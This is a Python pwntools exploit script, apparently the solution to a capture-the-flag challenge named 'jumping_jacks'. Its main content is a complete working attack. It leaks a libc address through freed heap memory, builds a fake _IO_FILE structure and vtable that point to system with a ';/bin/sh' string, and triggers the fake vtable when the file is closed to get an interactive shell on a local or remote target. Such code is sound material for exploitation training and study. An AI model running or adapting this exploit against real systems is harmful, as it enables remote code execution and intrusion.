#!/usr/bin/env python

from pwn import *
import sys

def addNote(size, idx, content):
    r.sendlineafter(">>", "1")
    r.sendlineafter("input", str(size))
    r.sendlineafter("index", str(idx))
    r.sendafter("Content", content)

def openFile():
    r.sendlineafter(">>", "4")

def editName(name):
    r.sendlineafter(">>", "6")
    r.sendline(name)

def removeNote(idx):
    r.sendlineafter(">>", "2")
    r.sendlineafter("index",str(idx))

def viewNote(idx):
    r.sendlineafter(">>", "3")
    r.sendlineafter("index",str(idx))
    return r.recvuntil("1)")

def closeFile():
    r.sendlineafter(">>", "5")

def exploit(r):
    libc = ELF('./libc.so.6')

    payload  = "B"*40
    ## FAKE _IO_FILE_plus struct STARTS HERE
    payload += "\xff"*4
    payload += ";/bin/sh\00"
    payload += "\xff"*(0x48-9)
    payload += p32(0x804A0C0) # fake vptr
    
    addNote(200, 0, "A"*200)
    addNote(256, 1, payload)

    removeNote(0)
    addNote(200, 0,"\n")

    leak = viewNote(0)    
    libc_base =  u32(leak[5:9].ljust(4,'\0'))-0x1b27b0
    system = libc_base+libc.symbols['system']

    log.success("libc_base found at: "+hex(libc_base))
    log.success("system@libc found at: "+hex(system))
    
    openFile()

    ## FAKE VTABLE
    payload  = "A"*8
    payload += p32(system)
    payload += "A"*(64-len(payload))
    editName(payload)

    ## TRIGGER CLOSE VFUNC    
    closeFile()

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/inctf17/jumpingjacks/jumping_jacks'], env={"LD_PRELOAD":""})
        #r = process(['/home/vagrant/CTFs/inctf17/jumpingjacks/jumping_jacks'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
